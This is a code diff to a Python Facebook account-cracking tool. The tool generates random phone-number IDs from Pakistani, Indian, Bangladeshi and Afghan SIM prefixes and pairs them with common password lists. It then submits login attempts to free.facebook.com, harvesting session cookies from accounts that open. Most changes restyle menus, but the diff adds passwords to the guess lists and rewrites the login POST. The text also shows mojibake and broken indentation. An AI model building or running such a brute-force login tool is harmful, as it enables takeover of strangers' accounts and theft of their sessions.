@@ -328,22 +328,24 @@ def clear():
 
 
 
-#__________________LOGO____________#
-os.system("xdg-open https://facebook.com/groups/187986870133162/")
-logo=(f"""{A}
-{G1}                 
-{A}                   
-{G1}                    
-{A}                       
-{G1}                     
-	      {R}[{G1}9{R}]     {R}[{G1}9{R}]     {R}[{G1}9{R}]
-{A}
-{G1}[{A}={G1}]{G1}DEVELOPR {R}:{G1} Mr-Micky
-{G1}[{A}={G1}]{G1}FACEBOOK {R}:{G1} AZAN ALI CHAUDRY
-{G1}[{A}={G1}]{G1}TOOLS {R}   :{A} FILE{G1}{A}RANDOM
-{G1}[{A}={G1}]{G1}STATUS {R}  :{G1} FREE
-{G1}[{A}={G1}]{G1}VERSION {R} :{A} 0{G1}{A}25
-{A}""")
+logo =f"""                      
+{R} _______  _______  _______  _______  _______ 
+{P}(  ____ )(  ___  )(       )(  ____ \(  ___  )
+{H}| (    )|| (   ) || () () || (    \/| (   ) |
+{P}| (____)|| |   | || || || || (__    | |   | |
+|     __)| |   | || |(_)| ||  __)   | |   | |
+{H}| (\ (   | |   | || |   | || (      | |   | |
+{P}| ) \ \__| (___) || )   ( || (____/\| (___) |
+{R}|/   \__/(_______)|/     \|(_______/(_______)
+\t      {N}[{Brown} {xyztime()} {N}]
+{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{Y}âž¤{H}âž¤{R}âž¤{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+{P}[{H}â€¢{P}] AUTHOR   : {Developer}
+{P}[{H}â€¢{P}] GITHUB   : {Github}
+{P}[{H}â€¢{P}] FACEBOOK : {Facebook}
+{P}[{H}â€¢{P}] VERSION  : {Version}
+{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{Y}âž¤{H}âž¤{R}âž¤{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{P}"""
+def line():
+	print(f"{P}{50 * 'â”€'}") 
 
 
 
@@ -413,16 +415,16 @@ def creation(uid):
 def RANDOM_MENU():
     clear()
     print(f"{P}[{H}â€¢{P}] TODAY DATE :  {F} {date}")
-    print(f'\r{A}')
+    line()
     print(f"{N}[{H}âž¤{N}] COUNTRY :{H} {loc}") 
     print(f"{N}[{H}âž¤{N}] REGION  :{H} {regi}") 
     print(f"{N}[{H}âž¤{N}] NETWORK :{H} {network} ") 
     print(f"{N}[{H}âž¤{N}] YOUR IP :{H} {ip}") 
-    print(f'\r{A}')
+    line()
     print(f"{N}[{R}01{N}]{P} Random Number Cloning") 
     print(f"{N}[{R}02{N}]{P} Check Result")
     print(f"{N}[{R}00{N}]{P} Contact Developer")
-    print(f'\r{A}')
+    line()
     helloxyz = input(f"{N}[{B}f{N}]{P} CHOOSE : ")
     if helloxyz in ["1","01"]:
     	Method_Password()
@@ -442,7 +444,7 @@ def Check_Result():
 	print(f"{N}[{R}01{N}] Check Result {H}OK") 
 	print(f"{N}[{R}02{N}] Check Result {Y}CP")
 	print(f"{N}[{R}00{N}] Back to menu") 
-	print(f'\r{A}')
+	line()
 	xyzresult = input(f"Select option : ")
 	if xyzresult in ["", " "]:
 		print("\nDonot empty! ");time.sleep(2);Check_Result()
@@ -452,7 +454,7 @@ def Check_Result():
 		for xyz in zyx:
 			print(f"\033[1;92m")
 			print(xyz)
-		print(f'\r{A}')
+		line()
 		input(f" [ Press Enter To Back ] ")
 		RANDOM_MENU()
 	elif xyzresult in ["2", "02"]:
@@ -461,7 +463,7 @@ def Check_Result():
 		for xyz in zyx:
 			print(f"\033[1;91m")
 			print(xyz)
-		print(f'\r{A}')
+		line()
 		input(f" [ Press Enter To Back ] ")
 		RANDOM_MENU()
 	elif xyzresult in ["0", "00"]:
@@ -473,10 +475,9 @@ def Method_Password():
     print(logo)
     #try:os.popen('play-audio Voice/PASSWORD.mp3')
     #except:pass
-    print(f'\r{A}')	
     print(f"{N}[{H}01{N}]{P} AUTO PASSWORD")
     print(f"{N}[{H}02{N}]{P} CHOOSE PASSWORD")
-    print(f'\r{A}')
+    line()
     helloxyz = input(f"{N}[{B}f{N}] CHOOSE : ")
     if helloxyz in ["1","01"]:
         YounisXyz_XyzCoder()
@@ -540,18 +541,18 @@ def YounisXyz_XyzCoder():
     	#Apk.append("n")
     #else:
     #	print(f"\n{P}[{R}!{P}] Please Select Between y/n .... ");time.sleep(2);YounisXyz_XyzCoder()
-    print(f'\r{A}')
+    line()
     print(f"{F}\t~ PASSWORD MENU ~") 
-    print(f'\r{A}')
+    line()
     print(f'''\t\033[1;97m[\x1b[1;99m\x1b[1;41m READ CAREFULLY \x1b[0m\033[1;97m]''')
-    print(f'\r{A}')
-    print(f'\r{A} AUTO PASS 7 DIGITS         {N}[{H}ALL COUNTRY{N}]")
-    print(f'\r{A} AUTO PASS 7 AND 11 DIGITS  {N}[{H}ALL COUNTRY{N}]")
-    print(f'\r{A} AUTO ULTIMATE PASS {H}FOR PAKISTAN")
-    print(f'\r{A} AUTO ULTIMATE PASS {pink}FOR INDIA")
-    print(f'\r{A} AUTO ULTIMATE PASS {Brown}FOR BANGLADESH")
-    print(f'\r{A} AUTO ULTIMATE PASS {B}AFGHANISTAN")
-    print(f'\r{A}')
+    print(f"{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{Y}âž¤{H}âž¤{R}âž¤{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{P}") 
+    print(f"{N}[{R}01{N}]{P} AUTO PASS 7 DIGITS         {N}[{H}ALL COUNTRY{N}]")
+    print(f"{N}[{R}02{N}]{P} AUTO PASS 7 AND 11 DIGITS  {N}[{H}ALL COUNTRY{N}]")
+    print(f"{N}[{R}03{N}]{P} AUTO ULTIMATE PASS {H}FOR PAKISTAN")
+    print(f"{N}[{R}04{N}]{P} AUTO ULTIMATE PASS {pink}FOR INDIA")
+    print(f"{N}[{R}05{N}]{P} AUTO ULTIMATE PASS {Brown}FOR BANGLADESH")
+    print(f"{N}[{R}06{N}]{P} AUTO ULTIMATE PASS {B}AFGHANISTAN")
+    print(f"{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{Y}âž¤{H}âž¤{R}âž¤{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{P}") 
     print(f"{P}[{R}!{P}] type '\033[1;92mpak\033[0;97m' for see pak country password or type '\033[1;92mind\033[0;97m' for see indion password or type '\033[1;92mbd\033[0;97m' for see bangladesh password or type '\033[1;92mafg\033[0;97m' for see AFG password")
     pxc = input(f'{N}[{B}f{N}] CHOOSE : ')
     if pxc in ['Pak','pak']:
@@ -566,19 +567,16 @@ def YounisXyz_XyzCoder():
     if pxc in ['afg','Afg','AFG']:
     	line();print(f"{Afghanistan}") 
     	line();input(" [ Press Enter to Back ] ");YounisXyz_XyzCoder()
-    print(f'\r{A}')
+    line()
     print(f"{P}\tAny Input Your Country Sim Code {H}>>>") 
-    print(f'\r{A}')
+    line()
     print(f'''\t\033[1;97m[\x1b[1;99m\x1b[1;42m CODE EXAMPLE ðŸ” \x1b[0m\033[1;97m]''')
-    print(f'\r{A}')
+    print(f"{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{Y}âž¤{H}âž¤{R}âž¤{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{P}") 
     print(f"{N}[{H}EX PAKISTAN CODE{N}]: 0300,0302,0310,0312,0333,0341")
-    print(f'\r{A}')	
     print(f"{N}[{pink}EX INDIA CODE{N}]: +91630,91766,91941,91981,91962,91809,91745")
-    print(f'\r{A}')	
     print(f"{N}[{Brown}EX BANGLADESH CODE{N}]: 88013,88014,88015,88016,88017,88018,88019")
-    print(f'\r{A}')	
     print(f"{N}[{B}EX AFGHANISTAN CODE{N}]: 9378, 9370, 9376, 9373, 9379")
-    print(f'\r{A}')
+    print(f"{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{Y}âž¤{H}âž¤{R}âž¤{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{P}") 
     code = input(f'{N}[{B}f{N}] PUT CODE : ')
     os.system("clear")
     print(logo)
@@ -593,20 +591,16 @@ def YounisXyz_XyzCoder():
         
         if "y" in Display_info:
         	jalan(f"{P}[{H}â€¢{P}] TODAY DATE :  {F} {date}")
-        	print(f'\r{A}')
+        	line()
         	jalan(f"{N}[{H}â€¢{N}] COUNTRY :{H} {loc}") 
-            print(f'\r{A}')
         	jalan(f"{N}[{H}â€¢{N}] REGION  :{H} {regi}") 
-            print(f'\r{A}')
         	jalan(f"{N}[{H}â€¢{N}] NETWORK :{H} {network} ") 
-           print(f'\r{A}') 
-           jalan(f"{N}[{H}â€¢{N}] YOUR IP :{H} {ip}")
-           print(f'\r{A}')	     
+        	jalan(f"{N}[{H}â€¢{N}] YOUR IP :{H} {ip}");line()
         print(f"{N}[{H}âž¤{N}]{H} OPERATOR  {Brown}â”€âž¤{N} "+code+f"{H} TOTAL IDs {Brown}â”€âž¤{N} "+tl+" ")
         print(f"{N}[{H}âž¤{N}] TODAY DATE & TIME :{R} {day}/{month}/{year} {Brown}â”€âž¤ {H} "+str(x)+":"+str(lt()[4])+" "+ tag+" ")
         print(f"{N}[{H}âž¤{N}]{Brown} If No Result {N}[{H}ON{N}/{R}OFF{N}]{Brown} Airplane Mode")
         print(f"{N}[{H}âž¤{N}] Your {H}OK{N}/{Y}CP {N}IDs Save In {H}> {N}/sdcard/ROMEO")
-        print(f'\r{A}')
+        line()
         for xyzcoderz in user:
             uid = code+xyzcoderz
             if pxc in ['1','01']:
@@ -614,7 +608,7 @@ def YounisXyz_XyzCoder():
             elif pxc in ['2','02']:
             	pwx = [xyzcoderz,uid]
             elif pxc in ['3','03']:
-            	pwx = [xyzcoderz,uid,'khan1122','i love you','khankhan','khan123','khan786','baloch']
+            	pwx = [xyzcoderz,uid,'khan1122','i love you','khankhan','khan123','khan786','baloch','ali123','ali786']
             elif pxc in ['4','04']:
             	pwx = [xyzcoderz,uid,'free fire','i love you','freefire','57272300','59039200']
             elif pxc in ['5','05']:
@@ -625,11 +619,11 @@ def YounisXyz_XyzCoder():
             	pwx = [xyzcoderz,uid,'khan1122','i love you','khankhan','khan123','khan786','baloch']
             XYZCODERS.submit(YounisXyz,uid,pwx,tl)
     print()
-    print(f'\r{A}')
+    print(f"{H}<{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{Y}âž¤{H}âž¤{R}âž¤{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{H}>") 
     print(f'{N}[{H}â€¢{N}] CLONING COMPLETED')
     print(f'{P}[{H}â€¢{P}] TOTAL {H}OK {P}IDS :{H} '+str(len(ok))+'')
     print(f'{P}[{H}â€¢{P}] TOTAL {Y}CP {P}IDS :{Brown} '+str(len(cp))+'')
-    print(f'\r{A}')
+    print(f"{H}<{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{Y}âž¤{H}âž¤{R}âž¤{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{H}>") 
     input(f'{P}[>] PRESS ENTER TO BACK MENU   ');os.system("clear");RANDOM_MENU()
 
 
@@ -684,16 +678,16 @@ def Choice_Password():
     	#Apk.append("n")
     #else:
     #	print(f"\n{P}[{R}!{P}] Please Select Between y/n .... ");time.sleep(2);YounisXyz_XyzCoder()
-    print(f'\r{A}')
+    line()
     print(f"{P}\tAny Input Your Country Sim Code {H}>>>") 
-    print(f'\r{A}')
+    line()
     print(f'''\t\033[1;97m[\x1b[1;99m\x1b[1;42m CODE EXAMPLE ðŸ” \x1b[0m\033[1;97m]''')
-    print(f'\r{A}')
+    print(f"{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{Y}âž¤{H}âž¤{R}âž¤{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{P}") 
     print(f"{N}[{H}EX PAKISTAN CODE{N}]: 0300,0302,0310,0312,0333,0341")
     print(f"{N}[{pink}EX INDIA CODE{N}]: 91766,91941,91981,91962,91809,91745")
     print(f"{N}[{Brown}EX BANGLADESH CODE{N}]: 88013,88014,88015,88016,88017,88018,88019")
     print(f"{N}[{B}EX AFGHANISTAN CODE{N}]: 9378, 9370, 9376, 9373, 9379")
-    print(f'\r{A}')
+    print(f"{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{Y}âž¤{H}âž¤{R}âž¤{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{P}") 
     code = input(f'{N}[{B}f{N}] PUT CODE : ')
     print(f"{N}[{H}âž¤{N}]{P} For Example : 1000, 2000, 5000, 10000")
     limit = int(input(f'{N}[{B}f{N}] How Many Numbers Do You Want To Add ? :{H} '))
@@ -701,7 +695,7 @@ def Choice_Password():
         nmp = ''.join(random.choice(string.digits) for _ in range(7))
         user.append(nmp)
     passx = int(input(f"{N}[{R}?{N}] How Many Password Do You Want To Add ? : ")) 
-    print(f'\r{A}') ;print(f'''\t\033[1;97m[\x1b[1;99m\x1b[1;41m PASSWORD EXAMPLE \x1b[0m\033[1;97m]''');print(f'\r{A}');print(f"{N}[{R}PAKISTAN{N}]{H} khan1122,i love you,khankhan,khan123,khan786,baloch");print(f"{N}[{R}INDIA{N}]{pink} free fire,freefire,i love you,57272300,59039200");print(f"{N}[{R}BANGLADESH{N}]{Brown} free fire,freefirei love you,Bangladesh,bangladesh");print(f"{N}[{R}AFGHANISTAN{N}]{B} free fire,freefire,i love you,khankhan,khan123,khan1122,Afghan123,Afghanistan,100200,kabul123");print(f'\r{A}');print(f"{N}[{R}!{N}]{Brown} Enter The Password As Your Choice")
+    print(f"{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{Y}âž¤{H}âž¤{R}âž¤{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{P}") ;print(f'''\t\033[1;97m[\x1b[1;99m\x1b[1;41m PASSWORD EXAMPLE \x1b[0m\033[1;97m]''');print(f"{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{Y}âž¤{H}âž¤{R}âž¤{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{P}");print(f"{N}[{R}PAKISTAN{N}]{H} khan1122,i love you,khankhan,khan123,khan786,baloch");print(f"{N}[{R}INDIA{N}]{pink} free fire,freefire,i love you,57272300,59039200");print(f"{N}[{R}BANGLADESH{N}]{Brown} free fire,freefirei love you,Bangladesh,bangladesh");print(f"{N}[{R}AFGHANISTAN{N}]{B} free fire,freefire,i love you,khankhan,khan123,khan1122,Afghan123,Afghanistan,100200,kabul123");print(f"{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{Y}âž¤{H}âž¤{R}âž¤{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{P}");print(f"{N}[{R}!{N}]{Brown} Enter The Password As Your Choice")
     YounisXYZ = []
     for younis in range(passx):
         pww = input(f"{N}[{H}âž¤{N}]{P} Enter Password : ")
@@ -711,17 +705,16 @@ def Choice_Password():
         clear()
         if "y" in Display_info:
         	jalan(f"{P}[{H}â€¢{P}] TODAY DATE :  {F} {date}")
-        	print(f'\r{A}')
+        	line()
         	jalan(f"{N}[{H}â€¢{N}] COUNTRY :{H} {loc}") 
         	jalan(f"{N}[{H}â€¢{N}] REGION  :{H} {regi}") 
         	jalan(f"{N}[{H}â€¢{N}] NETWORK :{H} {network} ") 
-        	jalan(f"{N}[{H}â€¢{N}] YOUR IP :{H} {ip}")
-        print(f'\r{A}')
+        	jalan(f"{N}[{H}â€¢{N}] YOUR IP :{H} {ip}");line()
         print(f"{N}[{H}âž¤{N}]{H} OPERATOR  {Brown}â”€âž¤{N} "+code+f"{H} TOTAL IDs {Brown}â”€âž¤{N} "+tl+" ")
         print(f"{N}[{H}âž¤{N}] TODAY DATE & TIME :{R} {day}/{month}/{year} {Brown}â”€âž¤ {H} "+str(x)+":"+str(lt()[4])+" "+ tag+" ")
         print(f"{N}[{H}âž¤{N}]{Brown} If No Result {N}[{H}ON{N}/{R}OFF{N}]{Brown} Airplane Mode")
         print(f"{N}[{H}âž¤{N}] Your {H}OK{N}/{Y}CP {N}IDs Save In {H}> {N}/sdcard/ROMEO")
-        print(f'\r{A}')
+        line()
         for xyzcoderz in user:
             #pwx = [xyzcoderz[1:]]
             uid = code+xyzcoderz
@@ -730,11 +723,11 @@ def Choice_Password():
                 pwx.append(Alina)
             XYZCODERS.submit(YounisXyz,uid,pwx,tl)
     print()
-    print(f'\r{A}')
+    print(f"{H}<{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{Y}âž¤{H}âž¤{R}âž¤{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{H}>") 
     print(f'{N}[{H}â€¢{N}] CLONING COMPLETED')
     print(f'{P}[{H}â€¢{P}] TOTAL {H}OK {P}IDS :{H} '+str(len(ok))+'')
     print(f'{P}[{H}â€¢{P}] TOTAL {Y}CP {P}IDS :{Brown} '+str(len(cp))+'')
-    print(f'\r{A}')
+    print(f"{H}<{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{Y}âž¤{H}âž¤{R}âž¤{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{H}>") 
     input(f'{P}[>] PRESS ENTER TO BACK MENU   ');os.system("clear");RANDOM_MENU()
 
     
@@ -762,6 +755,8 @@ def YounisXyz(uid,pwx,tl):
             "login":"Log In"}
             xyzheader_fuck = {
     'authority': 'free.facebook.com',
+    'method': 'GET',
+    'scheme': 'https',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en;q=0.9',
     'cache-control': 'max-age=0',
@@ -780,12 +775,7 @@ def YounisXyz(uid,pwx,tl):
     'upgrade-insecure-requests': '1',
     'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
     'viewport-width': '980',}
-
-response = requests.get(
-    'https://free.facebook.com/login/?email=100077668020450&li=ce3FZeZLaKjDJTIvxOr-aHSB&e=1647001&shbl=1&ref=dbl&wtsid=rdr_0lR3jo5CSmjUxcR06&refsrc=deprecated&rtime=1707810349&hrc=1&_rdr',
-    cookies=cookies,
-    headers=headers,
-)
+            lo = session.post('https://free.facebook.com/login/?ref=dbl&fl&login_from_aymh=1',data=log_data,headers=xyzheader_fuck).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
